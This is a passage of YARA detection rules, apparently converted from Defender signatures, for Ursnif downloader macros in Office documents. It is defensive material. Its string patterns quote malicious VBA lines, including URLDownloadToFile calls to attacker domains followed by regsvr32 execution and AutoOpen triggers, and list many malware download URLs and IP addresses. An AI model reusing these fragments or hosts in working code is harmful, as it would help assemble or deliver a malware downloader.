        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-2] 2c 20 22 [0-6] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 53 70 6c 69 74 28 [0-2] 2c 20 22 2d 2d 2d 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {22 72 65 67 73 76 72 33 32 20 22 20 2b 20 5a 28 31 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_ENC_2147755930_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.ENC!MTB"
        threat_id = "2147755930"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\zKfsgSt\\QPqYpbf\\QzikFhm.exe" ascii //weight: 1
        $x_1_2 = "C:\\kTTGsUq\\DRyQCGf\\aWLfVMa.exe" ascii //weight: 1
        $x_1_3 = "C:\\HppcPqN\\ZnVmYcD\\wshCsiw.exe" ascii //weight: 1
        $x_1_4 = "C:\\EnmaMnK\\WkSjVZz\\upeypgt.exe" ascii //weight: 1
        $x_1_5 = "C:\\ihmJQXC\\POehkcB\\WqvEtZi.exe" ascii //weight: 1
        $x_1_6 = "C:\\RpiepHV\\qeoMHkl\\eEPJbYv.exe" ascii //weight: 1
        $x_1_7 = "C:\\yxDagnS\\feuxBsR\\mHMUKpy.exe" ascii //weight: 1
        $x_1_8 = "C:\\pZkqmxP\\dlmvUPr\\MlMXRjT.exe" ascii //weight: 1
        $x_1_9 = "C:\\VMakTSG\\GhpCexd\\iLpnWKe.exe" ascii //weight: 1
        $x_1_10 = "C:\\LttgTtQ\\drYqcgG\\BwkGvmB.exe" ascii //weight: 1
        $x_1_11 = "C:\\LQNYbqM\\NWgbFUn\\mkewtQm.exe" ascii //weight: 1
        $x_1_12 = "C:\\pYYLxZv\\IWEVHLl\\fbQkaRf.exe" ascii //weight: 1
        $x_1_13 = "C:\\YmiRfEF\\foBdwbz\\KCmUWrU.exe" ascii //weight: 1
        $x_1_14 = "rundll32.exe" ascii //weight: 1
        $x_1_15 = "Shell32" ascii //weight: 1
        $x_1_16 = "ShellExecuteA" ascii //weight: 1
        $x_1_17 = "CreateDirectoryA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_URC_2147755931_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.URC!MTB"
        threat_id = "2147755931"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://gstat.matthewsalemstolper.com/pagament1.exe" ascii //weight: 1
        $x_1_2 = "http://gstat.ausagistment.com/pagament1.exe" ascii //weight: 1
        $x_1_3 = "http://gstat.llbntv.com/pagament1.exe" ascii //weight: 1
        $x_1_4 = "http://gstat.llbntv.org/pagament1.exe" ascii //weight: 1
        $x_1_5 = "https://anr8.com.au/loxarchiveFALSEsign.php" ascii //weight: 1
        $x_1_6 = "https://yyauto.com.au/settings/boss.php" ascii //weight: 1
        $x_1_7 = "https://www.lovekolaches.com/docusign/sign.php" ascii //weight: 1
        $x_1_8 = "https://tlanddissipate.at/3/rbs.dll" ascii //weight: 1
        $x_1_9 = "http://149.28.33.80/documents.php" ascii //weight: 1
        $x_1_10 = "http://45.63.30.20/l1o2c3o4m5o6t7i8v.php" ascii //weight: 1
        $x_1_11 = "http://www.adrelatemedia.com/haidress/gmail.php" ascii //weight: 1
        $x_1_12 = "https://memberteam.works/templatesb/superthemen.php" ascii //weight: 1
        $x_1_13 = "http://149.28.33.80/ODZACUQ.exe" ascii //weight: 1
        $x_1_14 = "https://entspartner.at/3/rsk.dll" ascii //weight: 1
        $x_1_15 = "https://ogglededibl.at/3/dws.dll" ascii //weight: 1
        $x_1_16 = "https://destgrena.at/3/tsk.dll" ascii //weight: 1
        $x_1_17 = "https://sdeputizi.at/3/dok.dll" ascii //weight: 1
        $x_1_18 = "https://utenti.online/1.exe" ascii //weight: 1
        $x_1_19 = "https://szn.services/1.exe" ascii //weight: 1
        $x_1_20 = "https://nl.mjndomein.systems/1.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_GM_2147757623_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.GM!MTB"
        threat_id = "2147757623"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Attribute VB_Name = \"H1\"" ascii //weight: 1
        $x_1_2 = "Public Const Mj As String = \"$$$\"" ascii //weight: 1
        $x_1_3 = "Public Const T As String = \"###\"" ascii //weight: 1
        $x_1_4 = "Replace(Join(ar1, \"\"), T, vbNullString)" ascii //weight: 1
        $x_1_5 = {53 70 6c 69 74 28 [0-16] 2c 20 4d 6a 29}  //weight: 1, accuracy: Low
        $x_1_6 = {61 72 31 28 30 29 20 3d 20 22 68 [0-4] 74 [0-4] 74 [0-4] 70 [0-4] 3a [0-4] 2f [0-4] 2f [0-20] 22}  //weight: 1, accuracy: Low
        $x_1_7 = {61 72 31 28 31 30 29 20 3d 20 [0-16] 2e [0-5] 64 [0-5] 61 [0-5] 74 [0-5] 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_CAB_2147759241_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.CAB!MTB"
        threat_id = "2147759241"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call URLDownloadToFile(0, \"http://d7uap.com/iz5/yaca.php?l=tze3.cab\", JK, 0, 0)" ascii //weight: 1
        $x_1_2 = "\"kE.tmp\"" ascii //weight: 1
        $x_1_3 = "fX.run \"regsvr32 \" & JK" ascii //weight: 1
        $x_1_4 = "Dim fX As New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_CAC_2147759396_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.CAC!MTB"
        threat_id = "2147759396"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call URLDownloadToFile(0, \"http://9ygw2.com/iz5/yaca.php?l=kpt1.cab\", Vw, 0, 0)" ascii //weight: 1
        $x_1_2 = "\"U.tmp\"" ascii //weight: 1
        $x_1_3 = "X.run \"regs\" + \"vr32 \" & Vw" ascii //weight: 1
        $x_1_4 = "Dim X As New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RT_2147759426_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RT!MTB"
        threat_id = "2147759426"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {69 6f 79 79 66 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f [0-10] 2e 63 61 62 22 4f 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {72 75 6e 20 22 72 [0-10] 65 [0-10] 67 [0-10] 73 [0-10] 76 [0-10] 72 [0-10] 33 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_SS_2147763890_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.SS!MTB"
        threat_id = "2147763890"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".setRequestHeader \"etag\", \"fetch\"" ascii //weight: 1
        $x_1_2 = "= Replace(lorca, cessione, \"\")" ascii //weight: 1
        $x_1_3 = {4d 73 67 42 6f 78 20 28 4c 65 6e 28 [0-31] 28 28 [0-15] 28 22 [0-10] 68 [0-10] 74 [0-2] 74 70 [0-2] 73 3a [0-2] 2f 2f [0-2] 77 68 61 74 73 77 69 74 [0-2] 2e 63 [0-3] 6f 6d 22 29 29 29 29 20 2d 20 [0-4] 20 2d 20 [0-2] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_SS_2147763890_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.SS!MTB"
        threat_id = "2147763890"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 6a 6a 20 3d 20 77 2e 47 65 74 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 28 30 20 2b 20 6a 29 [0-3] 41 6a 6a 20 3d 20 41 6a 6a 20 26 20 22 5c 22 20 26 20 41 62 73 28 41 70 70 6c 69 63 61 74 69 6f 6e 2e 57 69 6e 64 6f 77 53 74 61 74 65 29 20 26 20 22 2e 22 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = "Call Shell((JJJ(j - 1) & a))" ascii //weight: 1
        $x_1_3 = "a = a & Mid(k.Cells(1, 1), Len(k.Cells(1, j)) + 1, j)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_VA_2147769939_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.VA!MTB"
        threat_id = "2147769939"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://onlinecompaniehouse.com/sorvD2." ascii //weight: 1
        $x_10_2 = "https://onlinecompaniehouse.com/sorv.png " ascii //weight: 10
        $x_1_3 = "sorv.png" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_VA_2147769939_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.VA!MTB"
        threat_id = "2147769939"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"c:\\programdata\\RrKki.pdf\"" ascii //weight: 1
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-40] 28 33 29 20 26 20 22 2e 22 20 26 20 [0-40] 28 33 29 20 26 20 22 72 65 71 75 65 73 74 2e 35 2e 31 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-40] 28 [0-40] 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_5 = ".exec (YBxsP)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_VA_2147769939_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.VA!MTB"
        threat_id = "2147769939"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"c:\\programdata\\hMDcJ.pdf\"" ascii //weight: 1
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-40] 28 33 29 20 26 20 22 2e 22 20 26 20 [0-40] 28 33 29 20 26 20 22 72 65 71 75 65 73 74 2e 35 2e 31 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-40] 28 [0-40] 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_5 = ".exec (KsVoJ)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BKC_2147771264_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BKC!MTB"
        threat_id = "2147771264"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GlobalClearDocument.Open \"GET\", \"http://\" & ListBox1.List(3), False" ascii //weight: 1
        $x_1_2 = "RightDocument.SaveToFile (\"C:\\users\\public\\ftr.cpl\")" ascii //weight: 1
        $x_1_3 = "CreateObject(ListBox1.List(4)).Run (LinkNamespaceRef + \"C:\\users\\public\\ftr.cpl\")" ascii //weight: 1
        $x_1_4 = "ListBox1.AddItem (\"systemlive.casa/statis1c.dll\")" ascii //weight: 1
        $x_1_5 = "ListBox1.AddItem (\"regsvr32 \")" ascii //weight: 1
        $x_1_6 = "ListBox1.AddItem (\"WScript.Shell\")" ascii //weight: 1
        $x_1_7 = "Application.Run \"Def\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BKD_2147771265_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BKD!MTB"
        threat_id = "2147771265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ArrayListbox.Open \"GET\", \"http://\" & ListBox1.List(3), False" ascii //weight: 1
        $x_1_2 = "VbStorage.SaveToFile (\"C:\\users\\public\\wtt.gz\")" ascii //weight: 1
        $x_1_3 = "CreateObject(ListBox1.List(4)).Run (OptionSwapDatabase + \"C:\\users\\public\\wtt.gz\")" ascii //weight: 1
        $x_1_4 = "ListBox1.AddItem (\"systemok.casa/statis1c.dll\")" ascii //weight: 1
        $x_1_5 = "ListBox1.AddItem (\"regsvr32 \")" ascii //weight: 1
        $x_1_6 = "ListBox1.AddItem (\"WScript.Shell\")" ascii //weight: 1
        $x_1_7 = "Application.Run \"Def\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BKE_2147771266_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BKE!MTB"
        threat_id = "2147771266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Open \"GET\", \"http://\" & ListBox1.List(3), False" ascii //weight: 1
        $x_1_2 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-8] 2e [0-3] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 34 29 29 2e 52 75 6e 20 28 [0-20] 20 2b 20 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-8] 2e [0-3] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 [0-8] 2e 63 61 73 61 2f 73 74 61 74 69 73 31 63 2e 64 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "ListBox1.AddItem (\"regsvr32 \")" ascii //weight: 1
        $x_1_6 = "ListBox1.AddItem (\"WScript.Shell\")" ascii //weight: 1
        $x_1_7 = "Application.Run \"Def\"" ascii //weight: 1
        $x_1_8 = {53 75 62 20 44 65 66 28 29 02 00 55 73 65 72 46 6f 72 6d 31 2e 43 6f 6d 6d 61 6e 64 42 75 74 74 6f 6e 32 5f 43 6c 69 63 6b 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BKF_2147771477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BKF!MTB"
        threat_id = "2147771477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 22 20 26 20 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 33 29 2c 20 46 61 6c 73 65 [0-48] 2e 53 65 6e 64 [0-21] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-16] 22 29 [0-16] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 34 29 29 2e 52 75 6e 20 22 22 20 26 20 28 [0-32] 20 2b 20 22 33 32 20 22 20 26 20 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-16] 22 29 [0-16] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_4 = "ListBox1.AddItem (CommandButton4.Tag)" ascii //weight: 1
        $x_1_5 = "ListBox1.AddItem (Image1.Tag)" ascii //weight: 1
        $x_1_6 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 [0-32] 2f 70 31 63 74 75 72 65 33 2e 6a 70 67 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 54 65 78 74 42 6f 78 32 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_8 = "If Application.CheckSpelling(aWord.Text) Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_BKG_2147771756_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.BKG!MTB"
        threat_id = "2147771756"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "One = \"Please enter the line length\"" ascii //weight: 1
        $x_1_2 = "Worksheets(\"Sheet2\").SaveAs Length & Jizz, Rez" ascii //weight: 1
        $x_1_3 = "Dim Two As String" ascii //weight: 1
        $x_1_4 = "Two = \"Please enter the line amount\"" ascii //weight: 1
        $x_1_5 = "Worksheets(\"Sheet1\").SaveAs Length & Wizz, Rez" ascii //weight: 1
        $x_1_6 = "Dim Three As String" ascii //weight: 1
        $x_1_7 = {54 68 72 65 65 20 3d 20 22 50 6c 65 61 73 65 20 65 6e 74 65 72 20 74 68 65 20 6c 69 6e 65 20 6c 65 6e 67 74 68 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_8 = "Public Function Setter()" ascii //weight: 1
        $x_1_9 = "Rez = 42" ascii //weight: 1
        $x_1_10 = {57 69 7a 7a 20 3d 20 22 2e 78 6c 73 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_11 = "Public Function Putter()" ascii //weight: 1
        $x_1_12 = "Jizz = \".fo\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AJP_2147774155_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AJP!MTB"
        threat_id = "2147774155"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Sub CommandButton1_Click()" ascii //weight: 1
        $x_1_2 = "ListBox1.AddItem (Image1.ControlTipText)" ascii //weight: 1
        $x_1_3 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 3a 2f 2f [0-48] 2e 63 61 73 61 2f 66 6f 6f 74 65 72 2e 6a 70 67 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e 50 61 73 74 65 52 65 6d 6f 76 65 20 3d 20 22 43 3a 5c 75 73 65 72 73 5c 50 75 62 6c 69 63 5c 22 20 2b 20 22 [0-6] 2e 6a 70 67 22}  //weight: 1, accuracy: Low
        $x_1_5 = "InstrumentationUtil.LinkDelete = \"http\"" ascii //weight: 1
        $x_1_6 = "InstrumentationUtil.WindowProcedureArray = \"GET\"" ascii //weight: 1
        $x_1_7 = "InstrumentationUtil.LinkDelete & ListBox1.List(3), False" ascii //weight: 1
        $x_1_8 = "Shell! \"\" + ((LocalCount + \" \" & PasteRemove))" ascii //weight: 1
        $x_1_9 = "= Len(\"ZZZ\") Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AJQ_2147774157_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AJQ!MTB"
        threat_id = "2147774157"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Sub CommandButton1_Click()" ascii //weight: 1
        $x_1_2 = "ListBox1.AddItem (Image1.ControlTipText)" ascii //weight: 1
        $x_1_3 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 3a 2f 2f [0-48] 2e 63 61 73 61 2f 66 6f 6f 74 65 72 2e 6a 70 67 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 3d 20 22 43 3a 5c 75 73 65 72 73 5c 50 75 62 6c 69 63 5c 22 20 2b 20 22 [0-6] 2e 6a 70 67 22}  //weight: 1, accuracy: Low
        $x_1_5 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 3d 20 22 68 74 74 70 22}  //weight: 1, accuracy: Low
        $x_1_6 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 3d 20 22 47 45 54 22}  //weight: 1, accuracy: Low
        $x_1_7 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 26 20 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 33 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_8 = {53 68 65 6c 6c 21 20 22 22 20 2b 20 28 28 [0-32] 20 2b 20 22 20 22 20 26 20 [0-32] 29 29}  //weight: 1, accuracy: Low
        $x_1_9 = "= Len(\"ZZZ\") Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AJR_2147774158_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AJR!MTB"
        threat_id = "2147774158"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Sub CommandButton1_Click()" ascii //weight: 1
        $x_1_2 = "ListBox1.AddItem (Image1.ControlTipText)" ascii //weight: 1
        $x_1_3 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 3a 2f 2f [0-48] 2e 63 61 73 61 2f 6c 6f 67 69 6e 2e 6a 70 67 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 3a 2f 2f [0-48] 2e 63 79 6f 75 2f 6c 6f 67 69 6e 2e 6a 70 67 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-37] 20 3d 20 22 43 3a 5c 75 73 65 72 73 5c 50 75 62 6c 69 63 5c 22 20 2b 20 22 [0-6] 2e 6a 70 67 22}  //weight: 1, accuracy: Low
        $x_1_6 = {49 6e 73 74 72 75 6d 65 6e 74 61 74 69 6f 6e 55 74 69 6c 2e [0-32] 20 3d 20 22 68 74 74 70 22}  //weight: 1, accuracy: Low
